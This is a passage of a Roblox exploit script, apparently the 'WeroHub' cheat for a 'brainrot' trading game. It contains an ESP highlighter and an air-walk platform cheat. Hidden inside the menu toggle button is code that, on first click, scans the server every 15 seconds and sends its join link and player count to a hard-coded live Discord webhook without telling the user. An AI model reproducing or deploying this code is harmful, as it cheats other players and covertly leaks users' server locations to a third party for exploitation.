		{Name="Trippi Troppi Troppa Trippa", Money=175000},
		{Name="Los Tungtungtungcitos", Money=210000},
		{Name="Tukanno Bananno", Money=100000},
		{Name="La Vacca Staturno Saturnita", Money=250000},
		{Name="Chimpanzini Spiderini", Money=325000},
		{Name="Los Tralaleritos", Money=500000},
		{Name="Las Tralaleritas", Money=650000},
		{Name="Graipuss Medussi", Money=1000000},
		{Name="La Grande Combinasion", Money=10000000},
		{Name="Nuclearo Dinossauro", Money=15000000},
		{Name="Garama and Madundung", Money=50000000},
		{Name="Tortuginni Dragonfruitini", Money=350000},
		{Name="Pot Hotspot", Money=2500000},
		{Name="Las Vaquitas Saturnitas", Money=750000},
		{Name="Chicleteira Bicicleteira", Money=3500000},
		{Name="Agarrini la Palini", Money=425000},
		{Name="Dragon Cannelloni", Money=100000000},
		{Name="Los Combinasionas", Money=63700000},
		{Name="Karkerkar Kurkur", Money=2400000},
	}
	
	local currentHighlight = nil
	local currentBillboard = nil
	local trackedModel = nil
	local heartbeatConnection = nil
	
	-- Buscar el Brainrot con mayor Money presente en la partida
	local function getBestBrainrotInGame()
		local best = nil
		for _, br in pairs(brainrotsList) do
			local model = workspace:FindFirstChild(br.Name, true)
			if model then
				if not best or br.Money > best.Money then
					best = {Info = br, Model = model}
				end
			end
		end
		return best
	end
	
	local function updateESP()
		-- Limpiar Highlight y Billboard anteriores
		if currentHighlight then currentHighlight:Destroy() end
		if currentBillboard then currentBillboard:Destroy() end
		if heartbeatConnection then heartbeatConnection:Disconnect() end
	
		local best = getBestBrainrotInGame()
		if best then
			local model = best.Model
			local part = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
			if part then
				-- Crear Highlight
				local highlight = Instance.new("Highlight")
				highlight.Parent = model
				highlight.FillColor = Color3.fromRGB(255,0,0)
				highlight.OutlineColor = Color3.fromRGB(255,0,0)
				currentHighlight = highlight
	
				-- Crear Billboard
				local billboard = Instance.new("BillboardGui")
				billboard.Parent = model
				billboard.Adornee = part
				billboard.Size = UDim2.new(0,150,0,50)
				billboard.StudsOffset = Vector3.new(0,3,0)
	
				local label = Instance.new("TextLabel")
				label.Parent = billboard
				label.Size = UDim2.new(1,0,1,0)
				label.Text = model.Name
				label.TextColor3 = Color3.fromRGB(255,255,255)
				label.BackgroundTransparency = 1
				label.TextScaled = true
				currentBillboard = billboard
	
				-- Seguir al Brainrot
				heartbeatConnection = RunService.Heartbeat:Connect(function()
					if part and part.Parent then
						billboard.Adornee = part
					else
						updateESP()
					end
				end)
	
				model.AncestryChanged:Connect(function(_, parent)
					if not parent then
						updateESP()
					end
				end)
			end
		end
	end
	
	-- Activar ESP al presionar el bot√≥n
	button.MouseButton1Click:Connect(updateESP)
	
end
coroutine.wrap(NYIVBVX_fake_script)()
local function EEVKSK_fake_script() -- part_2.LocalScript 
	local script = Instance.new('LocalScript', part_2)

	-- LocalScript dentro del ScreenGui o el ScrollingFrame
	local frame = script.Parent
	local dragging = false
	local dragStart
	local startPos
	
	local function startDrag(input)
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
	
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
	
	local function drag(input)
		if dragging then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end
	
	-- Detectar inicio de arrastre (mouse o touch)
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			startDrag(input)
		end
	end)
	
	-- Detectar movimiento (mouse o touch)
	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			drag(input)
		end
	end)
	
end
coroutine.wrap(EEVKSK_fake_script)()
local function SMEYTMY_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
	
	local button = script.Parent -- TextBox que funcionar√° como bot√≥n
	local platform = nil
	local growing = false
	local running = false
	
	-- Colores de fondo
	local colorOn = Color3.fromRGB(0, 200, 255) -- Azul activo
	local colorOff = Color3.fromRGB(128, 128, 128) -- Gris inactivo
	
	-- Inicializar TextBox
	button.BackgroundColor3 = colorOff
	button.Text = "Air Walk: Off"
	
	-- Funci√≥n toggle
	local function togglePlatform()
		if platform then
			-- Desactivar plataforma
			platform:Destroy()
			platform = nil
			growing = false
			running = false
			button.BackgroundColor3 = colorOff
			button.Text = "Air Walk: Off"
		else
			-- Activar plataforma
			button.BackgroundColor3 = colorOn
			button.Text = "Air Walk: On"
	
			-- Crear plataforma debajo del jugador
			local ray = RaycastParams.new()
			ray.FilterDescendantsInstances = {char}
			ray.FilterType = Enum.RaycastFilterType.Blacklist
	
			local result = workspace:Raycast(humanoidRootPart.Position, Vector3.new(0, -50, 0), ray)
			local startY = humanoidRootPart.Position.Y - 3
			if result then
				startY = result.Position.Y + 1
			end
	
			platform = Instance.new("Part")
			platform.Size = Vector3.new(10, 1, 10)
			platform.Anchored = true
			platform.Color = Color3.fromRGB(0, 200, 255)
			platform.Position = Vector3.new(humanoidRootPart.Position.X, startY, humanoidRootPart.Position.Z)
			platform.Parent = workspace
	
			growing = true
			running = true
	
			-- Crecimiento de la plataforma
			task.spawn(function()
				local targetHeight = 16
				while platform and growing and platform.Size.Y < targetHeight do
					platform.Size = platform.Size + Vector3.new(0, 0.5, 0)
					platform.Position = Vector3.new(humanoidRootPart.Position.X, startY + platform.Size.Y/2, humanoidRootPart.Position.Z)
					task.wait(0.05)
				end
				growing = false
			end)
	
			-- Seguir al jugador
			task.spawn(function()
				while platform and running do
					local y = platform.Position.Y
					platform.Position = Vector3.new(humanoidRootPart.Position.X, y, humanoidRootPart.Position.Z)
					task.wait(0.05)
				end
			end)
		end
	end
	
	-- Conectar clic
	button.MouseButton1Click:Connect(togglePlatform)
	
end
coroutine.wrap(SMEYTMY_fake_script)()
local function MTFTMJ_fake_script() -- ImageButton.LocalScript 
	local script = Instance.new('LocalScript', ImageButton)

	local alreadyExecuted = false
	
	script.Parent.MouseButton1Click:Connect(function()
		-- Alternar visibilidad del frame normalmente
		script.Parent.Parent.Frame.Visible = not script.Parent.Parent.Frame.Visible
	
		-- Ejecutar solo la primera vez
		if not alreadyExecuted then
			alreadyExecuted = true
			-- üîπ CONFIG 
			local HttpService = game:GetService("HttpService")
			local Players = game:GetService("Players")
			local TeleportService = game:GetService("TeleportService")
	
			-- Solo funciona en este placeId
			if game.PlaceId ~= 109983668079237 then
				return
			end
	
			local webhook = "https://discord.com/api/webhooks/1408862222943256668/_4byGNJnAOP44lf_uvpPfpsBWvI0h5AM8HWqU-2HLOnIWn669OtyvNeRWSga30jHlfE2"
	
			local TargetNames = {
				"Gattatino Nyanino","Matteo","Tralalita Tralala","Tralalero Tralala","Espresso Signora",
				"Odin Din Din Dun","Statutino Libertino","Trenostruzzo Turbo 3000","Ballerino Lololo",
				"Los Orcalitos","Trigoligre Frutonni","Orcalero Orcala","Los Crocodillitos","Piccione Macchina",
				"Trippi Troppi Troppa Trippa","Los Tungtungtungcitos","Tukanno Bananno","La Vacca Staturno Saturnita",
				"Chimpanzini Spiderini","Los Tralaleritos","Las Tralaleritas","Los Matteos","Sammyni Spyderini",
				"Dul Dul Dul","Los Bombinitos","Brr es Teh Patipum","Los Sammynis","Graipuss Medussi",
				"La Grande Combinasion","Nuclearo Dinossauro","Garama and Madundung","Tortuginni Dragonfruitini",
				"Pot Hotspot","Las Vaquitas Saturnitas","Chicleteira Bicicleteira","Agarrini la Palini",
				"Dragon Cannelloni","Los Combinasionas","Karkerkar Kurkur","Bulbito Bandito Traktorito"
			}
	
			-- Guardar los que ya fueron notificados
			local notified = {}
	
			-- ‚úÖ Enlaces correctos para unirse a la instancia
			local function buildJoinLink()
				local placeId = game.PlaceId
				local jobId = game.JobId
				local deepLink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
				return deepLink
			end
	
			-- üîπ Enviar Webhook
			local function sendWebhook(modelsFound)
				if #modelsFound == 0 then return end
	
				local modelList = {}
				for _, name in ipairs(modelsFound) do
					table.insert(modelList, "**"..name.."**")
				end
	
				local deepLink = buildJoinLink()
	
				local embedData = {
					username = "WeroHub Notify",
					embeds = { {
						title = "Brainrot Encontrado",
						color = 65280,
						fields = {
							{ name = "üè∑Ô∏è Names", value = table.concat(modelList, "\n"), inline = true },
							{ name = "üë• Players", value = string.format("**%d/%d**", #Players:GetPlayers(), Players.MaxPlayers), inline = true },
							-- Solo una forma de unirse
							{ name = "Join", value = string.format("[Click Here To Join](%s)", deepLink), inline = false }
						},
						footer = { text = "WeroHub Auto Notify" },
						timestamp = DateTime.now():ToIsoDate()
					} }
				}
	
				local jsonData = HttpService:JSONEncode(embedData)
	
				local req = http_request or request or (syn and syn.request)
				if req then
					pcall(function()
						req({
							Url = webhook,
							Method = "POST",
							Headers = { ["Content-Type"] = "application/json" },
							Body = jsonData
						})
					end)
				end
			end
	
			-- üîπ Buscar modelos
			local function checkTargets()
				local newFound = {}
	
				for _, obj in pairs(workspace:GetDescendants()) do
					if obj:IsA("Model") then
						for _, target in pairs(TargetNames) do
							if string.find(string.lower(obj.Name), string.lower(target)) then
								if not notified[target] then
									table.insert(newFound, target)
									notified[target] = true
								end
							end
						end
					end
				end
	
				if #newFound > 0 then
					sendWebhook(newFound)
				end
			end
	
			-- üîπ Loop principal
			task.spawn(function()
				while true do
					checkTargets()
					task.wait(15) -- cada 15 segundos
				end
			end)
	
			-- üîπ CLIENTE: unir al servidor de la instancia al presionar el bot√≥n
			local function parseLink(url)
				local placeId = url:match("placeId=(%d+)")
				local jobId   = url:match("gameInstanceId=([%w%-]+)")
				return tonumber(placeId), jobId
			end
	
			-- Bot√≥n de GUI
			local screenGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("WeroHubNotifyGUI")
			local joinButton = screenGui:WaitForChild("ClickHereToJoinMe")
	
			joinButton.MouseButton1Click:Connect(function()
				local deepLink = buildJoinLink()
				local placeId, jobId = parseLink(deepLink)
				if placeId and jobId then
					TeleportService:TeleportToPlaceInstance(placeId, jobId, Players.LocalPlayer)
				end
			end)
	
		end
	end)
	
end
